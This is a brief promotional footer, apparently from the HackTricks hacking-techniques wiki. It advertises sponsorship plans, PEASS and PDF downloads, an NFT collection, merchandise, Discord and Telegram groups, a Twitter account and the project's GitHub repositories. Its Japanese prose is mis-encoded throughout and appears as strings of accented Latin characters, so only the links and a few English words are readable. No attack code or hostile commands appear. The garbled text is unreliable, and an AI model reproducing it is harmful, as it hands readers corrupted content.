* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã‚Šã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã—ã¦ãã ã•ã„ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
